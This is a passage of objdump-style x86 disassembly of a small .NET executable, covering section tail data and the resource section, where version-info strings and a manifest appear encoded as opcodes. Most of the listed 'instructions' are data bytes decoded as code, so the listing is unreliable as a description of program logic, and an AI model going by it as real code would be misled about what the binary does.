  403ab7:	add    BYTE PTR ds:[eax],al
  403aba:	sbb    DWORD PTR [ebx+0x0],esi
  403abd:	add    BYTE PTR gs:[eax+eax*1+0x74],dh
  403ac2:	add    BYTE PTR [ecx+0x0],ch
  403ac5:	outs   dx,BYTE PTR ds:[esi]
  403ac6:	add    BYTE PTR [edi+0x0],ah
  403ac9:	jae    0x403acb
  403acb:	add    BYTE PTR cs:[eax+eax*1+0x61],ah
  403ad0:	add    BYTE PTR [eax+eax*1+0x0],dh
  403ad4:	ins    BYTE PTR es:[edi],dx
  403ad5:	jbe    0x403aeb
  403ad7:	aas    
  403ad8:	xor    edx,eax
  403ada:	mov    DWORD PTR [ebx-0x69],eax
  403add:	adc    DWORD PTR [eax+ecx*2],ebp
  403ae0:	mov    al,0x5e
  403ae2:	jl     0x403a6c
  403ae4:	add    BYTE PTR [eax+eiz*1],al
  403ae7:	add    DWORD PTR [ecx],eax
  403ae9:	push   cs
  403aea:	add    al,0x20
  403aec:	add    DWORD PTR [ecx],eax
  403aee:	add    al,BYTE PTR [eax+eiz*1]
  403af1:	add    DWORD PTR [ecx],eax
  403af3:	or     BYTE PTR [ebx],al
  403af5:	and    BYTE PTR [eax],al
  403af7:	add    DWORD PTR [eax+eax*1],eax
  403afa:	add    DWORD PTR [edx],eax
  403afc:	push   cs
  403afd:	add    esp,DWORD PTR [eax]
  403aff:	add    BYTE PTR [esi],cl
  403b01:	add    al,0x20
  403b03:	add    DWORD PTR [edx],eax
  403b05:	push   cs
  403b06:	add    eax,0x110e0100
  403b0b:	dec    ebp
  403b0c:	add    eax,DWORD PTR [eax]
  403b0e:	add    BYTE PTR [esi],cl
  403b10:	add    eax,0xe0e0200
  403b15:	push   cs
  403b16:	add    esp,DWORD PTR [eax]
  403b18:	add    BYTE PTR [edx],al
  403b1a:	push   es
  403b1b:	add    BYTE PTR [edx],al
  403b1d:	adc    bh,BYTE PTR ds:0x60e0e
  403b23:	add    ecx,DWORD PTR [esi]
  403b25:	push   cs
  403b26:	push   cs
  403b27:	push   cs
  403b28:	add    esp,DWORD PTR [eax]
  403b2a:	add    BYTE PTR [eax],cl
  403b2c:	push   es
  403b2d:	add    BYTE PTR [edx],al
  403b2f:	add    DWORD PTR [esi],ecx
  403b31:	sbb    eax,0x120050e
  403b36:	add    DWORD PTR [ecx],edx
  403b38:	ins    DWORD PTR es:[edi],dx
  403b39:	or     BYTE PTR [edi+0x19565c7a],dh
  403b3f:	xor    al,0xe0
  403b41:	mov    DWORD PTR [eax],ecx
  403b43:	add    DWORD PTR [eax],eax
  403b45:	add    DWORD PTR [eax],eax
  403b47:	add    BYTE PTR [eax],al
  403b49:	add    BYTE PTR [eax],al
  403b4b:	add    eax,0x1
  403b50:	add    BYTE PTR [edx],al
  403b52:	push   es
  403b53:	push   cs
  403b54:	add    al,BYTE PTR [esi]
  403b56:	or     BYTE PTR ds:0xe010220,al
  403b5c:	or     BYTE PTR [ebx],al
  403b5e:	push   es
  403b5f:	adc    bh,BYTE PTR ds:0x1010005
  403b65:	sbb    eax,0x100040e
  403b6a:	add    DWORD PTR [esi],ecx
  403b6c:	add    eax,DWORD PTR [eax]
  403b6e:	add    BYTE PTR [ecx],al
  403b70:	add    ebp,DWORD PTR [eax]
  403b72:	add    BYTE PTR [esi],cl
  403b74:	add    ebp,DWORD PTR [eax]
  403b76:	add    BYTE PTR [eax],cl
  403b78:	and    eax,0x45200001
  403b7d:	popa   
  403b7e:	jae    0x403be5
  403b80:	ja     0x403be3
  403b82:	jb     0x403be9
  403b84:	cs inc ebx
  403b86:	outs   dx,DWORD PTR ds:[esi]
  403b87:	outs   dx,BYTE PTR ds:[esi]
  403b88:	imul   sp,WORD PTR [edi+0x4c],0x6e61
  403b8e:	addr16 jne 0x403bf2
  403b91:	addr16 gs inc esi
  403b94:	jb     0x403c05
  403b96:	ins    DWORD PTR es:[edi],dx
  403b97:	push   ebx
  403b98:	gs je  0x403c10
  403b9b:	jo     0x403b9d
  403b9d:	add    BYTE PTR ds:0x45080001,cl
  403ba3:	popa   
  403ba4:	jae    0x403c0b
  403ba6:	ja     0x403c09
  403ba8:	jb     0x403c0f
  403baa:	add    BYTE PTR [eax],al
  403bac:	xor    eax,0x43300001
  403bb1:	outs   dx,DWORD PTR ds:[esi]
  403bb2:	jo     0x403c2d
  403bb4:	jb     0x403c1f
  403bb6:	addr16 push 0xa9c22074
  403bbc:	and    BYTE PTR [edx],dh
  403bbe:	xor    BYTE PTR [ecx],dh
  403bc0:	xor    DWORD PTR [eax+eiz*1],ebp
  403bc3:	inc    ebp
  403bc4:	popa   
  403bc5:	jae    0x403c2c
  403bc7:	ja     0x403c2a
  403bc9:	jb     0x403c30
  403bcb:	and    BYTE PTR cs:[ecx+0x6c],al
  403bcf:	ins    BYTE PTR es:[edi],dx
  403bd0:	and    BYTE PTR [edx+0x69],dh
  403bd3:	addr16 push 0x65722074
  403bd9:	jae    0x403c40
  403bdb:	jb     0x403c53
  403bdd:	gs fs add BYTE PTR cs:[eax],al
  403be2:	sub    DWORD PTR [ecx],eax
  403be4:	add    BYTE PTR [eax+esi*1],ah
  403be7:	data16 xor BYTE PTR ss:[esi],dh
  403beb:	aaa    
  403bec:	xor    al,0x39
  403bee:	sub    eax,0x66303961
  403bf3:	sub    eax,0x35393434
  403bf8:	sub    eax,0x38343062
  403bfd:	sub    eax,0x65613439
  403c02:	xor    dh,BYTE PTR [eax]
  403c04:	xor    BYTE PTR [edx+0x37],ah
  403c07:	gs aaa 
  403c09:	aaa    
  403c0a:	add    BYTE PTR [eax],al
  403c0c:	or     al,0x1
  403c0e:	add    BYTE PTR [edi],al
  403c10:	xor    DWORD PTR [esi],ebp
  403c12:	xor    BYTE PTR [esi],ch
  403c14:	xor    al,0x2e
  403c16:	xor    BYTE PTR [eax],al
  403c18:	add    BYTE PTR [eax],cl
  403c1a:	add    DWORD PTR [eax],eax
  403c1c:	or     BYTE PTR [eax],al
  403c1e:	add    BYTE PTR [eax],al
  403c20:	add    BYTE PTR [eax],al
  403c22:	push   ds
  403c23:	add    DWORD PTR [eax],eax
  403c25:	add    DWORD PTR [eax],eax
  403c27:	push   esp
  403c28:	add    dl,BYTE PTR [esi]
  403c2a:	push   edi
  403c2b:	jb     0x403c8e
  403c2d:	jo     0x403c7d
  403c2f:	outs   dx,DWORD PTR ds:[esi]
  403c30:	outs   dx,BYTE PTR ds:[esi]
  403c31:	inc    ebp
  403c32:	js     0x403c97
  403c34:	gs jo  0x403cab
  403c37:	imul   ebp,DWORD PTR [edi+0x6e],0x6f726854
  403c3e:	ja     0x403cb3
  403c40:	add    DWORD PTR [edi],ebx
  403c42:	add    DWORD PTR [ebx],edx
  403c44:	sub    DWORD PTR [ebp+eax*2+0x46],eax
  403c48:	push   ecx
  403c49:	dec    eax
  403c4a:	push   ebx
  403c4b:	dec    edx
  403c4c:	push   ebp
  403c4d:	push   ecx
  403c4e:	dec    ebx
  403c4f:	push   ebx
  403c50:	dec    ebp
  403c51:	push   esp
  403c52:	pop    edx
  403c53:	push   edi
  403c54:	push   edi
  403c55:	push   edx
  403c56:	pop    ecx
  403c57:	pop    esp
  403c58:	pop    esp
  403c59:	pop    edi
  403c5a:	pop    ebp
  403c5b:	sub    ch,BYTE PTR [ebx]
  403c5d:	sub    al,0x2d
  403c5f:	cs das 
  403c61:	pop    ds
  403c62:	add    DWORD PTR [eax],eax
  403c64:	push   ss
  403c65:	xor    BYTE PTR [eax],dh
  403c67:	xor    BYTE PTR [edx],bh
  403c69:	xor    BYTE PTR [edx],bh
  403c6b:	xor    BYTE PTR [edx],bh
  403c6d:	xor    eax,0x342e352e
  403c72:	cmp    DWORD PTR ds:0x36342e34,esi
  403c78:	xor    eax,0x3437
  403c7d:	add    BYTE PTR [eax],al
  403c7f:	add    BYTE PTR [eax],al
  403c81:	or     DWORD PTR [edi],eax
  403c83:	push   es
  403c84:	push   cs
  403c85:	push   cs
  403c86:	push   cs
  403c87:	push   cs
  403c88:	push   cs
  403c89:	adc    al,BYTE PTR [ecx+0x5]
  403c8c:	pop    es
  403c8d:	add    bl,BYTE PTR ds:0x80e
  403c93:	add    BYTE PTR [esp+edi*1+0x0],bh
  403c9a:	add    BYTE PTR [eax],al
  403c9c:	add    BYTE PTR [eax],al
  403c9e:	add    BYTE PTR [eax],al
  403ca0:	fidivr WORD PTR [eax+eax*1]
  403ca3:	add    BYTE PTR [eax],al
  403ca5:	and    BYTE PTR [eax],al
	...
  403cbb:	add    al,dl
  403cbd:	cmp    al,0x0
	...
  403ccf:	add    BYTE PTR [eax],al
  403cd1:	add    BYTE PTR [edi+0x43],bl
  403cd4:	outs   dx,DWORD PTR ds:[esi]
  403cd5:	jb     0x403d1c
  403cd7:	js     0x403d3e
  403cd9:	dec    ebp
  403cda:	popa   
  403cdb:	imul   ebp,DWORD PTR [esi+0x0],0x6f63736d
  403ce2:	jb     0x403d49
  403ce4:	gs cs fs ins BYTE PTR es:[edi],dx
  403ce8:	ins    BYTE PTR es:[edi],dx
  403ce9:	add    BYTE PTR [eax],al
  403ceb:	add    BYTE PTR [eax],al
  403ced:	add    bh,bh
  403cef:	and    eax,0x402000

Disassembly of section .rsrc:

00404000 <.rsrc>:
	...
  40400c:	add    BYTE PTR [eax],al
  40400e:	add    al,BYTE PTR [eax]
  404010:	adc    BYTE PTR [eax],al
  404012:	add    BYTE PTR [eax],al
  404014:	and    BYTE PTR [eax],al
  404016:	add    BYTE PTR [eax+0x18],al
  40401c:	cmp    BYTE PTR [eax],al
  40401e:	add    BYTE PTR [eax+0x0],al
	...
  40402c:	add    BYTE PTR [eax],al
  40402e:	add    DWORD PTR [eax],eax
  404030:	add    DWORD PTR [eax],eax
  404032:	add    BYTE PTR [eax],al
  404034:	push   eax
  404035:	add    BYTE PTR [eax],al
  404037:	add    BYTE PTR [eax],0x0
	...
  404046:	add    DWORD PTR [eax],eax
  404048:	add    DWORD PTR [eax],eax
  40404a:	add    BYTE PTR [eax],al
  40404c:	push   0x800000
	...
  40405d:	add    BYTE PTR [ecx],al
  40405f:	add    BYTE PTR [eax],al
  404061:	add    BYTE PTR [eax],al
  404063:	add    BYTE PTR [eax+0x0],al
	...
  404075:	add    BYTE PTR [ecx],al
  404077:	add    BYTE PTR [eax],al
  404079:	add    BYTE PTR [eax],al
  40407b:	add    BYTE PTR [eax-0x60000000],dl
  404081:	inc    eax
  404082:	add    BYTE PTR [eax],al
  404084:	loopne 0x404089
	...
  40408e:	add    BYTE PTR [eax],al
  404090:	add    BYTE PTR [eax+eax*1+0x0],0xea
  404095:	add    DWORD PTR [eax],eax
	...
  40409f:	add    al,ah
  4040a1:	add    esi,DWORD PTR [eax+eax*1]
  4040a4:	add    BYTE PTR [eax],al
  4040a6:	push   esi
  4040a7:	add    BYTE PTR [ebx+0x0],dl
  4040aa:	pop    edi
  4040ab:	add    BYTE PTR [esi+0x0],dl
  4040ae:	inc    ebp
  4040af:	add    BYTE PTR [edx+0x0],dl
  4040b2:	push   ebx
  4040b3:	add    BYTE PTR [ecx+0x0],cl
  4040b6:	dec    edi
  4040b7:	add    BYTE PTR [esi+0x0],cl
  4040ba:	pop    edi
  4040bb:	add    BYTE PTR [ecx+0x0],cl
  4040be:	dec    esi
  4040bf:	add    BYTE PTR [esi+0x0],al
  4040c2:	dec    edi
  4040c3:	add    BYTE PTR [eax],al
  4040c5:	add    BYTE PTR [eax],al
  4040c7:	add    BYTE PTR [ebp+0xfeef04],bh
  4040cd:	add    BYTE PTR [ecx],al
  4040cf:	add    BYTE PTR [eax],al
  4040d1:	add    BYTE PTR [ecx],al
  4040d3:	add    BYTE PTR [eax],al
  4040d5:	add    BYTE PTR [eax+eax*1],al
  4040d8:	add    BYTE PTR [eax],al
  4040da:	add    DWORD PTR [eax],eax
  4040dc:	add    BYTE PTR [eax],al
  4040de:	add    al,0x0
  4040e0:	aas    
  4040e1:	add    BYTE PTR [eax],al
  4040e3:	add    BYTE PTR [eax],al
  4040e5:	add    BYTE PTR [eax],al
  4040e7:	add    BYTE PTR [eax+eax*1],al
  4040ea:	add    BYTE PTR [eax],al
  4040ec:	add    DWORD PTR [eax],eax
	...
  4040fa:	add    BYTE PTR [eax],al
  4040fc:	inc    esp
  4040fd:	add    BYTE PTR [eax],al
  4040ff:	add    BYTE PTR [ecx],al
  404101:	add    BYTE PTR [esi+0x0],dl
  404104:	popa   
  404105:	add    BYTE PTR [edx+0x0],dh
  404108:	inc    esi
  404109:	add    BYTE PTR [ecx+0x0],ch
  40410c:	ins    BYTE PTR es:[edi],dx
  40410d:	add    BYTE PTR [ebp+0x0],ah
  404110:	dec    ecx
  404111:	add    BYTE PTR [esi+0x0],ch
  404114:	data16 add BYTE PTR [edi+0x0],ch
  404118:	add    BYTE PTR [eax],al
  40411a:	add    BYTE PTR [eax],al
  40411c:	and    al,0x0
  40411e:	add    al,0x0
  404120:	add    BYTE PTR [eax],al
  404122:	push   esp
  404123:	add    BYTE PTR [edx+0x0],dh
  404126:	popa   
  404127:	add    BYTE PTR [esi+0x0],ch
  40412a:	jae    0x40412c
  40412c:	ins    BYTE PTR es:[edi],dx
  40412d:	add    BYTE PTR [ecx+0x0],ah
  404130:	je     0x404132
  404132:	imul   eax,DWORD PTR [eax],0x6e006f
  404138:	add    BYTE PTR [eax],al
  40413a:	add    BYTE PTR [eax],al
  40413c:	add    BYTE PTR [eax],al
  40413e:	mov    al,0x4
  404140:	inc    eax
  404141:	add    eax,DWORD PTR [eax]
  404143:	add    BYTE PTR [ecx],al
  404145:	add    BYTE PTR [ebx+0x0],dl
  404148:	je     0x40414a
  40414a:	jb     0x40414c
  40414c:	imul   eax,DWORD PTR [eax],0x67006e
  404152:	inc    esi
  404153:	add    BYTE PTR [ecx+0x0],ch
  404156:	ins    BYTE PTR es:[edi],dx
  404157:	add    BYTE PTR [ebp+0x0],ah
  40415a:	dec    ecx
  40415b:	add    BYTE PTR [esi+0x0],ch
  40415e:	data16 add BYTE PTR [edi+0x0],ch
  404162:	add    BYTE PTR [eax],al
  404164:	sbb    al,0x3
  404166:	add    BYTE PTR [eax],al
  404168:	add    DWORD PTR [eax],eax
  40416a:	xor    BYTE PTR [eax],al
  40416c:	xor    BYTE PTR [eax],al
  40416e:	xor    BYTE PTR [eax],al
  404170:	xor    BYTE PTR [eax],al
  404172:	xor    BYTE PTR [eax],al
  404174:	xor    al,0x0
  404176:	bound  eax,QWORD PTR [eax]
  404178:	xor    BYTE PTR [eax],al
  40417a:	add    BYTE PTR [eax],al
  40417c:	xor    al,0x0
  40417e:	or     DWORD PTR [eax],eax
  404180:	add    DWORD PTR [eax],eax
  404182:	inc    ebx
  404183:	add    BYTE PTR [edi+0x0],ch
  404186:	ins    DWORD PTR es:[edi],dx
  404187:	add    BYTE PTR [eax+0x0],dh
  40418a:	popa   
  40418b:	add    BYTE PTR [esi+0x0],ch
  40418e:	jns    0x404190
  404190:	dec    esi
  404191:	add    BYTE PTR [ecx+0x0],ah
  404194:	ins    DWORD PTR es:[edi],dx
  404195:	add    BYTE PTR [ebp+0x0],ah
  404198:	add    BYTE PTR [eax],al
  40419a:	add    BYTE PTR [eax],al
  40419c:	inc    ebp
  40419d:	add    BYTE PTR [ecx+0x0],ah
  4041a0:	jae    0x4041a2
  4041a2:	add    BYTE PTR gs:[edi+0x0],dh
  4041a6:	popa   
  4041a7:	add    BYTE PTR [edx+0x0],dh
  4041aa:	add    BYTE PTR gs:[eax],al
  4041ad:	add    BYTE PTR [eax],al
  4041af:	add    BYTE PTR [eax+eax*1+0x21],ch
  4041b3:	add    BYTE PTR [ecx],al
  4041b5:	add    BYTE PTR [esi+0x0],al
  4041b8:	imul   eax,DWORD PTR [eax],0x65006c
  4041be:	inc    esp
  4041bf:	add    BYTE PTR [ebp+0x0],ah
  4041c2:	jae    0x4041c4
  4041c4:	arpl   WORD PTR [eax],ax
  4041c6:	jb     0x4041c8
  4041c8:	imul   eax,DWORD PTR [eax],0x740070
  4041ce:	imul   eax,DWORD PTR [eax],0x6e006f
  4041d4:	add    BYTE PTR [eax],al
  4041d6:	add    BYTE PTR [eax],al
  4041d8:	inc    ebp
  4041d9:	add    BYTE PTR [ecx+0x0],ah
  4041dc:	jae    0x4041de
  4041de:	add    BYTE PTR gs:[edi+0x0],dh
  4041e2:	popa   
  4041e3:	add    BYTE PTR [edx+0x0],dh
  4041e6:	add    BYTE PTR gs:[esi],ch
  4041e9:	add    BYTE PTR [ebx+0x0],al
  4041ec:	outs   dx,DWORD PTR ds:[esi]
  4041ed:	add    BYTE PTR [esi+0x0],ch
  4041f0:	data16 add BYTE PTR [ecx+0x0],ch
  4041f4:	add    BYTE PTR [si+0x0],cl
  4041f8:	popa   
  4041f9:	add    BYTE PTR [esi+0x0],ch
  4041fc:	add    BYTE PTR [di+0x0],dh
  404200:	popa   
  404201:	add    BYTE PTR [edi+0x0],ah
  404204:	add    BYTE PTR gs:[esi+0x0],al
  404208:	jb     0x40420a
  40420a:	outs   dx,DWORD PTR ds:[esi]
  40420b:	add    BYTE PTR [ebp+0x0],ch
  40420e:	push   ebx
  40420f:	add    BYTE PTR [ebp+0x0],ah
  404212:	je     0x404214
  404214:	jne    0x404216
  404216:	jo     0x404218
  404218:	add    BYTE PTR [eax],al
  40421a:	add    BYTE PTR [eax],al
  40421c:	xor    BYTE PTR [eax],al
  40421e:	or     BYTE PTR [eax],al
  404220:	add    DWORD PTR [eax],eax
  404222:	inc    esi
  404223:	add    BYTE PTR [ecx+0x0],ch
  404226:	ins    BYTE PTR es:[edi],dx
  404227:	add    BYTE PTR [ebp+0x0],ah
  40422a:	push   esi
  40422b:	add    BYTE PTR [ebp+0x0],ah
  40422e:	jb     0x404230
  404230:	jae    0x404232
  404232:	imul   eax,DWORD PTR [eax],0x6e006f
  404238:	add    BYTE PTR [eax],al
  40423a:	add    BYTE PTR [eax],al
  40423c:	xor    DWORD PTR [eax],eax
  40423e:	add    BYTE PTR cs:[eax],dh
  404241:	add    BYTE PTR [esi],ch
  404243:	add    BYTE PTR [eax+eax*1],dh
  404246:	add    BYTE PTR cs:[eax],dh
  404249:	add    BYTE PTR [eax],al
  40424b:	add    BYTE PTR [eax+eax*1+0x25],ch
  40424f:	add    BYTE PTR [ecx],al
  404251:	add    BYTE PTR [ecx+0x0],cl
  404254:	outs   dx,BYTE PTR ds:[esi]
  404255:	add    BYTE PTR [eax+eax*1+0x65],dh
  404259:	add    BYTE PTR [edx+0x0],dh
  40425c:	outs   dx,BYTE PTR ds:[esi]
  40425d:	add    BYTE PTR [ecx+0x0],ah
  404260:	ins    BYTE PTR es:[edi],dx
  404261:	add    BYTE PTR [esi+0x0],cl
  404264:	popa   
  404265:	add    BYTE PTR [ebp+0x0],ch
  404268:	add    BYTE PTR gs:[eax],al
  40426b:	add    BYTE PTR [ebp+0x0],al
  40426e:	popa   
  40426f:	add    BYTE PTR [ebx+0x0],dh
  404272:	add    BYTE PTR gs:[edi+0x0],dh
  404276:	popa   
  404277:	add    BYTE PTR [edx+0x0],dh
  40427a:	add    BYTE PTR gs:[esi],ch
  40427d:	add    BYTE PTR [ebx+0x0],al
  404280:	outs   dx,DWORD PTR ds:[esi]
  404281:	add    BYTE PTR [esi+0x0],ch
  404284:	data16 add BYTE PTR [ecx+0x0],ch
  404288:	add    BYTE PTR [si+0x0],cl
  40428c:	popa   
  40428d:	add    BYTE PTR [esi+0x0],ch
  404290:	add    BYTE PTR [di+0x0],dh
  404294:	popa   
  404295:	add    BYTE PTR [edi+0x0],ah
  404298:	add    BYTE PTR gs:[esi+0x0],al
  40429c:	jb     0x40429e
  40429e:	outs   dx,DWORD PTR ds:[esi]
  40429f:	add    BYTE PTR [ebp+0x0],ch
  4042a2:	push   ebx
  4042a3:	add    BYTE PTR [ebp+0x0],ah
  4042a6:	je     0x4042a8
  4042a8:	jne    0x4042aa
  4042aa:	jo     0x4042ac
  4042ac:	add    BYTE PTR cs:[ebp+0x0],ah
  4042b0:	js     0x4042b2
  4042b2:	add    BYTE PTR gs:[eax],al
  4042b5:	add    BYTE PTR [eax],al
  4042b7:	add    BYTE PTR [eax+eax*1+0x10030],al
  4042be:	dec    esp
  4042bf:	add    BYTE PTR [ebp+0x0],ah
  4042c2:	add    BYTE PTR [bx+di+0x0],ah
  4042c6:	ins    BYTE PTR es:[edi],dx
  4042c7:	add    BYTE PTR [ebx+0x0],al
  4042ca:	outs   dx,DWORD PTR ds:[esi]
  4042cb:	add    BYTE PTR [eax+0x0],dh
  4042ce:	jns    0x4042d0
  4042d0:	jb     0x4042d2
  4042d2:	imul   eax,DWORD PTR [eax],0x680067
  4042d8:	je     0x4042da
  4042da:	add    BYTE PTR [eax],al
  4042dc:	inc    ebx
  4042dd:	add    BYTE PTR [edi+0x0],ch
  4042e0:	jo     0x4042e2
  4042e2:	jns    0x4042e4
  4042e4:	jb     0x4042e6
  4042e6:	imul   eax,DWORD PTR [eax],0x680067
  4042ec:	je     0x4042ee
  4042ee:	and    BYTE PTR [eax],al
  4042f0:	test   eax,0x32002000
  4042f5:	add    BYTE PTR [eax],dh
  4042f7:	add    BYTE PTR [ecx],dh
  4042f9:	add    BYTE PTR [ecx],dh
  4042fb:	add    BYTE PTR [eax+eax*1],ch
  4042fe:	and    BYTE PTR [eax],al
  404300:	inc    ebp
  404301:	add    BYTE PTR [ecx+0x0],ah
  404304:	jae    0x404306
  404306:	add    BYTE PTR gs:[edi+0x0],dh
  40430a:	popa   
  40430b:	add    BYTE PTR [edx+0x0],dh
  40430e:	add    BYTE PTR gs:[esi],ch
  404311:	add    BYTE PTR [eax],ah
  404313:	add    BYTE PTR [ecx+0x0],al
  404316:	ins    BYTE PTR es:[edi],dx
  404317:	add    BYTE PTR [eax+eax*1+0x20],ch
  40431b:	add    BYTE PTR [edx+0x0],dh
  40431e:	imul   eax,DWORD PTR [eax],0x680067
  404324:	je     0x404326
  404326:	and    BYTE PTR [eax],al
  404328:	jb     0x40432a
  40432a:	add    BYTE PTR gs:[ebx+0x0],dh
  40432e:	add    BYTE PTR gs:[edx+0x0],dh
  404332:	jbe    0x404334
  404334:	add    BYTE PTR gs:[eax+eax*1+0x2e],ah
  404339:	add    BYTE PTR [eax],al
  40433b:	add    BYTE PTR [eax+eax*1+0x25],dh
  40433f:	add    BYTE PTR [ecx],al
  404341:	add    BYTE PTR [edi+0x0],cl
  404344:	jb     0x404346
  404346:	imul   eax,DWORD PTR [eax],0x690067
  40434c:	outs   dx,BYTE PTR ds:[esi]
  40434d:	add    BYTE PTR [ecx+0x0],ah
  404350:	ins    BYTE PTR es:[edi],dx
  404351:	add    BYTE PTR [esi+0x0],al
  404354:	imul   eax,DWORD PTR [eax],0x65006c
  40435a:	outs   dx,BYTE PTR ds:[esi]
  40435b:	add    BYTE PTR [ecx+0x0],ah
  40435e:	ins    DWORD PTR es:[edi],dx
  40435f:	add    BYTE PTR [ebp+0x0],ah
  404362:	add    BYTE PTR [eax],al
  404364:	inc    ebp
  404365:	add    BYTE PTR [ecx+0x0],ah
  404368:	jae    0x40436a
  40436a:	add    BYTE PTR gs:[edi+0x0],dh
  40436e:	popa   
  40436f:	add    BYTE PTR [edx+0x0],dh
  404372:	add    BYTE PTR gs:[esi],ch
  404375:	add    BYTE PTR [ebx+0x0],al
  404378:	outs   dx,DWORD PTR ds:[esi]
  404379:	add    BYTE PTR [esi+0x0],ch
  40437c:	data16 add BYTE PTR [ecx+0x0],ch
  404380:	add    BYTE PTR [si+0x0],cl
  404384:	popa   
  404385:	add    BYTE PTR [esi+0x0],ch
  404388:	add    BYTE PTR [di+0x0],dh
  40438c:	popa   
  40438d:	add    BYTE PTR [edi+0x0],ah
  404390:	add    BYTE PTR gs:[esi+0x0],al
  404394:	jb     0x404396
  404396:	outs   dx,DWORD PTR ds:[esi]
  404397:	add    BYTE PTR [ebp+0x0],ch
  40439a:	push   ebx
  40439b:	add    BYTE PTR [ebp+0x0],ah
  40439e:	je     0x4043a0
  4043a0:	jne    0x4043a2
  4043a2:	jo     0x4043a4
  4043a4:	add    BYTE PTR cs:[ebp+0x0],ah
  4043a8:	js     0x4043aa
  4043aa:	add    BYTE PTR gs:[eax],al
  4043ad:	add    BYTE PTR [eax],al
  4043af:	add    BYTE PTR [eax+eax*1+0x21],ah
  4043b3:	add    BYTE PTR [ecx],al
  4043b5:	add    BYTE PTR [eax+0x0],dl
  4043b8:	jb     0x4043ba
  4043ba:	outs   dx,DWORD PTR ds:[esi]
  4043bb:	add    BYTE PTR [eax+eax*1+0x75],ah
  4043bf:	add    BYTE PTR [ebx+0x0],ah
  4043c2:	je     0x4043c4
  4043c4:	dec    esi
  4043c5:	add    BYTE PTR [ecx+0x0],ah
  4043c8:	ins    DWORD PTR es:[edi],dx
  4043c9:	add    BYTE PTR [ebp+0x0],ah
  4043cc:	add    BYTE PTR [eax],al
  4043ce:	add    BYTE PTR [eax],al
  4043d0:	inc    ebp
  4043d1:	add    BYTE PTR [ecx+0x0],ah
  4043d4:	jae    0x4043d6
  4043d6:	add    BYTE PTR gs:[edi+0x0],dh
  4043da:	popa   
  4043db:	add    BYTE PTR [edx+0x0],dh
  4043de:	add    BYTE PTR gs:[esi],ch
  4043e1:	add    BYTE PTR [ebx+0x0],al
  4043e4:	outs   dx,DWORD PTR ds:[esi]
  4043e5:	add    BYTE PTR [esi+0x0],ch
  4043e8:	data16 add BYTE PTR [ecx+0x0],ch
  4043ec:	add    BYTE PTR [si+0x0],cl
  4043f0:	popa   
  4043f1:	add    BYTE PTR [esi+0x0],ch
  4043f4:	add    BYTE PTR [di+0x0],dh
  4043f8:	popa   
  4043f9:	add    BYTE PTR [edi+0x0],ah
  4043fc:	add    BYTE PTR gs:[esi+0x0],al
  404400:	jb     0x404402
  404402:	outs   dx,DWORD PTR ds:[esi]
  404403:	add    BYTE PTR [ebp+0x0],ch
  404406:	push   ebx
  404407:	add    BYTE PTR [ebp+0x0],ah
  40440a:	je     0x40440c
  40440c:	jne    0x40440e
  40440e:	jo     0x404410
  404410:	add    BYTE PTR [eax],al
  404412:	add    BYTE PTR [eax],al
  404414:	xor    al,0x0
  404416:	or     BYTE PTR [eax],al
  404418:	add    DWORD PTR [eax],eax
  40441a:	push   eax
  40441b:	add    BYTE PTR [edx+0x0],dh
  40441e:	outs   dx,DWORD PTR ds:[esi]
  40441f:	add    BYTE PTR [eax+eax*1+0x75],ah
  404423:	add    BYTE PTR [ebx+0x0],ah
  404426:	je     0x404428
  404428:	push   esi
  404429:	add    BYTE PTR [ebp+0x0],ah
  40442c:	jb     0x40442e
  40442e:	jae    0x404430
  404430:	imul   eax,DWORD PTR [eax],0x6e006f
  404436:	add    BYTE PTR [eax],al
  404438:	xor    DWORD PTR [eax],eax
  40443a:	add    BYTE PTR cs:[eax],dh
  40443d:	add    BYTE PTR [esi],ch
  40443f:	add    BYTE PTR [eax+eax*1],dh
  404442:	add    BYTE PTR cs:[eax],dh
  404445:	add    BYTE PTR [eax],al
  404447:	add    BYTE PTR [eax],bh
  404449:	add    BYTE PTR [eax],cl
  40444b:	add    BYTE PTR [ecx],al
  40444d:	add    BYTE PTR [ecx+0x0],al
  404450:	jae    0x404452
  404452:	jae    0x404454
  404454:	add    BYTE PTR gs:[ebp+0x0],ch
  404458:	bound  eax,QWORD PTR [eax]
  40445a:	ins    BYTE PTR es:[edi],dx
  40445b:	add    BYTE PTR [ecx+0x0],bh
  40445e:	and    BYTE PTR [eax],al
  404460:	push   esi
  404461:	add    BYTE PTR [ebp+0x0],ah
  404464:	jb     0x404466
  404466:	jae    0x404468
  404468:	imul   eax,DWORD PTR [eax],0x6e006f
  40446e:	add    BYTE PTR [eax],al
  404470:	xor    DWORD PTR [eax],eax
  404472:	add    BYTE PTR cs:[eax],dh
  404475:	add    BYTE PTR [esi],ch
  404477:	add    BYTE PTR [eax+eax*1],dh
  40447a:	add    BYTE PTR cs:[eax],dh
  40447d:	add    BYTE PTR [eax],al
  40447f:	add    bh,ch
  404481:	mov    ebx,0x783f3cbf
  404486:	ins    DWORD PTR es:[edi],dx
  404487:	ins    BYTE PTR es:[edi],dx
  404488:	and    BYTE PTR [esi+0x65],dh
  40448b:	jb     0x404500
  40448d:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  404494:	xor    BYTE PTR [edx],ah
  404496:	and    BYTE PTR [ebp+0x6e],ah
  404499:	arpl   WORD PTR [edi+0x64],bp
  40449c:	imul   ebp,DWORD PTR [esi+0x67],0x5455223d
  4044a3:	inc    esi
  4044a4:	sub    eax,0x73202238
  4044a9:	je     0x40450c
  4044ab:	outs   dx,BYTE PTR ds:[esi]
  4044ac:	fs popa 
  4044ae:	ins    BYTE PTR es:[edi],dx
  4044af:	outs   dx,DWORD PTR ds:[esi]
  4044b0:	outs   dx,BYTE PTR ds:[esi]
  4044b1:	gs cmp eax,0x73657922
  4044b7:	and    bh,BYTE PTR [edi]
  4044b9:	ds or  eax,0x73613c0a
  4044bf:	jae    0x404526
  4044c1:	ins    DWORD PTR es:[edi],dx
  4044c2:	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
  4044c6:	js     0x404535
  4044c8:	ins    BYTE PTR es:[edi],dx
  4044c9:	outs   dx,BYTE PTR ds:[esi]
  4044ca:	jae    0x404509
  4044cc:	and    dh,BYTE PTR [ebp+0x72]
  4044cf:	outs   dx,BYTE PTR ds:[esi]
  4044d0:	cmp    dh,BYTE PTR [ebx+0x63]
  4044d3:	push   0x73616d65
  4044d8:	sub    eax,0x7263696d
  4044dd:	outs   dx,DWORD PTR ds:[esi]
  4044de:	jae    0x40454f
  4044e0:	data16 je 0x404510
  4044e3:	arpl   WORD PTR [edi+0x6d],bp
